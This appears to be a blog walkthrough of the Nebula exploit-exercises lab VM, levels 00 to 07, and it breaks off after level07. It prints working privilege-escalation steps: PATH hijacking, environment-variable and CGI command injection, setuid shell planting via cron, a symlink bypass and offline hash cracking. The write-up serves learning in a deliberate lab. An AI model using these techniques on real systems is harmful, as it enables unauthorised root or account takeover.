<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">

  
  <link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
  <link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <title>Nebula Exploit Exercises</title>

  
  
  <link rel="stylesheet" href="http://mislusnys.github.io/css/hugo-octopress.css">

  
  

  
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

  
  

  
  <link href="http://mislusnys.github.io/favicon.png" rel="icon">

  
  
  

  

  

  <meta name="description" content="">
  <meta name="keywords" content="">

  <meta name="author" content="Mindaugas Slusnys">

  
  <meta name="generator" content="Hugo 0.16-DEV" />

  
  

</head>
<body>


<header role="banner"><hgroup>
  
  <h1><a href="http://mislusnys.github.io/"></a></h1>
    <h2></h2>
</hgroup></header>


<nav role="navigation">


<ul class="main-navigation">
  
  
    
      <li><a href="http://mislusnys.github.io/" title="Blog">Blog</a></li>
    
  
    
      <li><a href="http://mislusnys.github.io/archive/" target="_blank" title="All posts">All posts</a></li>
    
  
</ul>


<ul class="subscription">
  

  
  

</ul>


<form action="https://www.google.com/search" method="get" target="_blank">
  <fieldset role="search">
  	<input class="search" type="text" name="q" results="0" placeholder="Search"/>
    <input type="hidden" name="q" value="site:http://mislusnys.github.io/" />
  </fieldset>
</form>

</nav>


<div id="main">
  <div id="content">
    <div>
      <article class="hentry" role="article">
        <header>
          <h1 class="entry-title">
            Nebula Exploit Exercises 
          </h1>
          <p class="meta">May 1, 2016 - 23 minute read - 

          

          
          
          <a class="label" href="http://mislusnys.github.io/categories/exploit">exploit</a><a class="label" href="http://mislusnys.github.io/categories/linux">linux</a>
          </p>
        </header>
        <div class="entry-content">
          
          
          
          

<h2 id="intro:2941ec772c52d0561257d6ef26aa317a">Intro</h2>

<p>Ever since I stumbled upon exploit exercises website - I wanted to try the challenges. They have three main exploitable VMs: Nebula, Protostar and Fusion.
The order represents the difficulty of exploitation.</p>

<p>The welcome page reads:</p>

<blockquote>
<p>exploit-exercises.com provides a variety of virtual machines, documentation and challenges
that can be used to learn about a variety of computer
security issues such as privilege escalation, vulnerability analysis, exploit development,
debugging, reverse engineering, and general cyber security issues.</p>
</blockquote>

<p>Here, I wrote down some of the findings while exploring the Nebula VM.</p>

<h2 id="about:2941ec772c52d0561257d6ef26aa317a">About</h2>

<p>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at</p>

<ul>
<li>SUID files</li>
<li>Permissions</li>
<li>Race conditions</li>
<li>Shell meta-variables</li>
<li>$PATH weaknesses</li>
<li>Scripting language weaknesses</li>
<li>Binary compilation failures</li>
</ul>

<p>At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.</p>

<h3 id="level00:2941ec772c52d0561257d6ef26aa317a">Level00</h3>

<p>Description:</p>

<blockquote>
<p>This level requires you to find a Set User ID program that will run as the “flag00” account.
You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>
</blockquote>



<figure class="code">
  <figcaption>
  	<span>Finding SUID flag00 files</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level00@nebula:~$ find / -user flag00 -perm -4000 -exec ls -l <span style="color: #f92672">{}</span> <span style="color: #ae81ff">\;</span> 2&gt;/dev/null
-rwsr-x--- <span style="color: #ae81ff">1</span> flag00 level00 <span style="color: #ae81ff">7358</span> 2011-11-20 21:22 /bin/.../flag00
-rwsr-x--- <span style="color: #ae81ff">1</span> flag00 level00 <span style="color: #ae81ff">7358</span> 2011-11-20 21:22 /rofs/bin/.../flag00
level00@nebula:~$
</pre></div>
</td></tr></table>
  </div>
</figure>




<figure class="code">
  <figcaption>
  	<span>Getting the flag</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level00@nebula:~$ id
<span style="color: #f8f8f2">uid</span><span style="color: #f92672">=</span>1001<span style="color: #f92672">(</span>level00<span style="color: #f92672">)</span> <span style="color: #f8f8f2">gid</span><span style="color: #f92672">=</span>1001<span style="color: #f92672">(</span>level00<span style="color: #f92672">)</span> <span style="color: #f8f8f2">groups</span><span style="color: #f92672">=</span>1001<span style="color: #f92672">(</span>level00<span style="color: #f92672">)</span>
level00@nebula:~$ /bin/.../flag00 
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag 
You have successfully executed getflag on a target account
flag00@nebula:~$ 
</pre></div>
</td></tr></table>
  </div>
</figure>


<h3 id="level01:2941ec772c52d0561257d6ef26aa317a">Level01</h3>

<p>Description:</p>

<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
</blockquote>



<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;unistd.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;string.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdio.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">gid_t</span> <span style="color: #f8f8f2">gid;</span>
  <span style="color: #66d9ef">uid_t</span> <span style="color: #f8f8f2">uid;</span>
  <span style="color: #f8f8f2">gid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getegid();</span>
  <span style="color: #f8f8f2">uid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">geteuid();</span>

  <span style="color: #f8f8f2">setresgid(gid,</span> <span style="color: #f8f8f2">gid,</span> <span style="color: #f8f8f2">gid);</span>
  <span style="color: #f8f8f2">setresuid(uid,</span> <span style="color: #f8f8f2">uid,</span> <span style="color: #f8f8f2">uid);</span>

  <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/usr/bin/env echo and now what?&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>


<p>Here the code uses <code>echo</code> binary to display a string. We can exploit that by modifying $PATH variable and placing our own version of <code>echo</code> in the PATH.
We can use the provided source code to get a shell by modifying the last line to execute <code>bash</code>:</p>



<figure class="code">
  <figcaption>
  	<span>Exploiting $PATH weakness</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level01@nebula:/home/flag01$ <span style="color: #f8f8f2">export</span> <span style="color: #f8f8f2">PATH</span><span style="color: #f92672">=</span>/tmp:$PATH
level01@nebula:/home/flag01$ cat /tmp/setuid.c 
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>

int main<span style="color: #f92672">(</span>int argc, char **argv, char **envp<span style="color: #f92672">)</span>
<span style="color: #f92672">{</span>
  gid_t gid<span style="color: #f8f8f2">;</span>
  uid_t uid<span style="color: #f8f8f2">;</span>
  <span style="color: #f8f8f2">gid</span> <span style="color: #f92672">=</span> getegid<span style="color: #f92672">()</span><span style="color: #f8f8f2">;</span>
  <span style="color: #f8f8f2">uid</span> <span style="color: #f92672">=</span> geteuid<span style="color: #f92672">()</span><span style="color: #f8f8f2">;</span>

  setresgid<span style="color: #f92672">(</span>gid, gid, gid<span style="color: #f92672">)</span><span style="color: #f8f8f2">;</span>
  setresuid<span style="color: #f92672">(</span>uid, uid, uid<span style="color: #f92672">)</span><span style="color: #f8f8f2">;</span>

  system<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/bin/bash&quot;</span><span style="color: #f92672">)</span><span style="color: #f8f8f2">;</span>
<span style="color: #f92672">}</span>
level01@nebula:/home/flag01$ gcc /tmp/setuid.c -o /tmp/echo
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ getflag 
You have successfully executed getflag on a target account
flag01@nebula:/home/flag01$ 
</pre></div>
</td></tr></table>
  </div>
</figure>


<h3 id="level02:2941ec772c52d0561257d6ef26aa317a">Level02</h3>

<p>Description:</p>

<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
</blockquote>



<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;unistd.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;string.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdio.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">buffer;</span>

  <span style="color: #66d9ef">gid_t</span> <span style="color: #f8f8f2">gid;</span>
  <span style="color: #66d9ef">uid_t</span> <span style="color: #f8f8f2">uid;</span>

  <span style="color: #f8f8f2">gid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getegid();</span>
  <span style="color: #f8f8f2">uid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">geteuid();</span>

  <span style="color: #f8f8f2">setresgid(gid,</span> <span style="color: #f8f8f2">gid,</span> <span style="color: #f8f8f2">gid);</span>
  <span style="color: #f8f8f2">setresuid(uid,</span> <span style="color: #f8f8f2">uid,</span> <span style="color: #f8f8f2">uid);</span>

  <span style="color: #f8f8f2">buffer</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">NULL;</span>

  <span style="color: #f8f8f2">asprintf(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">buffer,</span> <span style="color: #e6db74">&quot;/bin/echo %s is cool&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">getenv(</span><span style="color: #e6db74">&quot;USER&quot;</span><span style="color: #f8f8f2">));</span>
  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;about to call system(</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">%s</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buffer);</span>
  
  <span style="color: #f8f8f2">system(buffer);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>


<p>Here, we can inject additional commands into $USER environment variable and terminate the buffer with #:</p>



<figure class="code">
  <figcaption>
  	<span>Command Injection</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level02@nebula:/home/flag02$ <span style="color: #f8f8f2">export</span> <span style="color: #f8f8f2">USER</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;user &amp;&amp; /bin/bash #&quot;</span>
level02@nebula:/home/flag02$ ./flag02 
about to call system<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/bin/echo user &amp;&amp; /bin/bash # is cool&quot;</span><span style="color: #f92672">)</span>
user
flag02@nebula:/home/flag02$ getflag 
You have successfully executed getflag on a target account
flag02@nebula:/home/flag02$ 
</pre></div>
</td></tr></table>
  </div>
</figure>


<h3 id="level03:2941ec772c52d0561257d6ef26aa317a">Level03</h3>

<p>Description:</p>

<blockquote>
<p>Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.</p>
</blockquote>

<p>This level runs crontab every few minutes which executes anything from <code>writable.d</code> folder and then removes it.
We can reuse <code>/tmp/setuid.c</code> file from previous levels:</p>



<figure class="code">
  <figcaption>
  	<span>Exploiting Crontab</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level03@nebula:/home/flag03/writable.d$ cat exploit.sh
<span style="color: #75715e">#!/bin/bash</span>

gcc /tmp/setuid.c -o /home/flag03/shell
chmod +s /home/flag03/shell
level03@nebula:/home/flag03/writable.d$ <span style="color: #f8f8f2">cd</span> ..
level03@nebula:/home/flag03$ ./shell
flag03@nebula:/home/flag03$ getflag 
You have successfully executed getflag on a target account
flag03@nebula:/home/flag03$ 
</pre></div>
</td></tr></table>
  </div>
</figure>


<h3 id="level04:2941ec772c52d0561257d6ef26aa317a">Level04</h3>

<p>Description:</p>

<blockquote>
<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
</blockquote>

<p>

<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;unistd.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;string.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdio.h&gt;</span>
<span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;fcntl.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">];</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd,</span> <span style="color: #f8f8f2">rc;</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s [file to read]</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strstr(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #e6db74">&quot;token&quot;</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;You may not access &#39;%s&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">O_RDONLY);</span>
  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fd</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">err(EXIT_FAILURE,</span> <span style="color: #e6db74">&quot;Unable to open %s&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">rc</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">read(fd,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf));</span>
  
  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(rc</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">err(EXIT_FAILURE,</span> <span style="color: #e6db74">&quot;Unable to read fd %d&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">fd);</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">write(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #f8f8f2">rc);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>This code tries to read the <code>token</code> file which is read/write protected. We can bypass that by creating a symlink to the token and reading that instead.
The token file contains the password for <code>flag04</code> user.</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Symbolic Link Exploit</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level04@nebula:/home/flag04$ ln -s  /home/flag04/token /tmp/bypass
level04@nebula:/home/flag04$ ./flag04 /tmp/bypass
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level05:2941ec772c52d0561257d6ef26aa317a">Level05</h3>

<p>Description:</p>

<blockquote>
<p>Check the flag05 home directory. You are looking for weak directory permissions</p>
</blockquote>

<p>This level has world readable backup file which contains the private key for <code>flag05</code> user. We can use it to ssh in as <code>flag05</code>.</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Weak Permissions</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level05@nebula:/home/flag05$ <span style="color: #f8f8f2">cd</span> .backup/
level05@nebula:/home/flag05/.backup$ ls -al
total 2
drwxr-xr-x <span style="color: #ae81ff">2</span> flag05 flag05    <span style="color: #ae81ff">42</span> 2011-11-20 20:13 .
drwxr-x--- <span style="color: #ae81ff">4</span> flag05 level05   <span style="color: #ae81ff">93</span> 2012-08-18 06:56 ..
-rw-rw-r-- <span style="color: #ae81ff">1</span> flag05 flag05  <span style="color: #ae81ff">1826</span> 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ mkdir /tmp/backup
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/backup/
level05@nebula:/home/flag05/.backup$ <span style="color: #f8f8f2">cd</span> /tmp/backup/
level05@nebula:/tmp/backup$ tar xvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp/backup$ <span style="color: #f8f8f2">cd</span> .ssh
level05@nebula:/tmp/backup/.ssh$ ssh -i id_rsa flag05@localhost
The authenticity of host <span style="color: #e6db74">&#39;localhost (127.0.0.1)&#39;</span> can<span style="color: #e6db74">&#39;t be established.</span>
<span style="color: #e6db74">ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.</span>
<span style="color: #e6db74">Are you sure you want to continue connecting (yes/no)? yes</span>
<span style="color: #e6db74">Warning: Permanently added &#39;</span>localhost<span style="color: #960050; background-color: #1e0010">&#39;</span> <span style="color: #f92672">(</span>ECDSA<span style="color: #f92672">)</span> to the list of known hosts.
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level06:2941ec772c52d0561257d6ef26aa317a">Level06</h3>

<p>Description:</p>

<blockquote>
<p>The flag06 account credentials came from a legacy unix system.</p>
</blockquote>

<p>Upon closer inspection the /etc/passwd file has DES hash for <code>flag06</code> user:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Password Hash</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level06@nebula:~$ cat /etc/passwd <span style="color: #f8f8f2">|</span> grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
level06@nebula:~$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The VM itself does not have <code>john</code> installed, so I cracked the password in my local Kali box (the password was <strong>hello</strong>) and used it to get the flag:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Flag06</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level06@nebula:~$ su flag06 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h3 id="level07:2941ec772c52d0561257d6ef26aa317a">Level07</h3>

<p>Description:</p>

<blockquote>
<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
</blockquote>

<p>

<figure class="code">
  <figcaption>
  	<span>Source Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/usr/bin/perl</span>

<span style="color: #66d9ef">use</span> <span style="color: #f8f8f2">CGI</span> <span style="color: #e6db74">qw{param}</span><span style="color: #f8f8f2">;</span>

<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Content-type: text/html\n\n&quot;</span><span style="color: #f8f8f2">;</span>

<span style="color: #66d9ef">sub </span><span style="color: #a6e22e">ping</span> <span style="color: #f8f8f2">{</span>
  <span style="color: #f8f8f2">$host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">$_[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">];</span>

  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span style="color: #f8f8f2">);</span>

  <span style="color: #f8f8f2">@output</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">`ping -c 3 $host 2&gt;&amp;1`</span><span style="color: #f8f8f2">;</span>
  <span style="color: #66d9ef">foreach</span> <span style="color: #f8f8f2">$line</span> <span style="color: #f8f8f2">(@output)</span> <span style="color: #f8f8f2">{</span> <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;$line&quot;</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">}</span>

  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span style="color: #f8f8f2">);</span>
  
<span style="color: #f8f8f2">}</span>

<span style="color: #75715e"># check if Host set. if not, display normal page, etc</span>

<span style="color: #f8f8f2">ping(param(</span><span style="color: #e6db74">&quot;Host&quot;</span><span style="color: #f8f8f2">));</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The vulnerable script is served via thttpd:


<figure class="code">
  <figcaption>
  	<span>THTTPD</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">flag07    <span style="color: #ae81ff">1169</span>  0.0  0.1   <span style="color: #ae81ff">2588</span>   <span style="color: #ae81ff">892</span> ?        Ss   Apr29   0:01 /usr/sbin/thttpd -C /home/flag07/thttpd.conf
</pre></div>
</td></tr></table>
  </div>
</figure>

And it is running on port 7007.</p>

<p>The perl source code has a command injection vulnerability. We can inject arbitrary commands into the <code>Host</code> parameter.
I chose to reuse the setuid shell from previous levels (/tmp/shell).</p>

<p>The url encoded exploit:
<code>http://192.168.56.101:7007/index.cgi?Host=localhost|cp%20/tmp/shell%20~%20%26%26%20chmod%204755%20~/shell</code></p>

<p>Which executes:
<code>cp /tmp/shell ~ &amp;&amp; chmod 4755 ~/shell</code></p>

<p>After that we can grab the flag:


<figure class="code">
  <figcaption>
  	<span>Flag07</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level07@nebula:/home/flag07$ ls -l
total 13
-rwxr-xr-x <span style="color: #ae81ff">1</span> root   root    <span style="color: #ae81ff">368</span> 2011-11-20 21:22 index.cgi
-rwsr-xr-x <span style="color: #ae81ff">1</span> flag07 flag07 <span style="color: #ae81ff">7322</span> 2016-04-30 06:41 shell
-rw-r--r-- <span style="color: #ae81ff">1</span> root   root   <span style="color: #ae81ff">3719</span> 2011-11-20 21:22 thttpd.conf
level07@nebula:/home/flag07$ ./shell
flag07@nebula:/home/flag07$ getflag 
You have successfully executed getflag on a target account
flag07@nebula:/home/flag07$ 
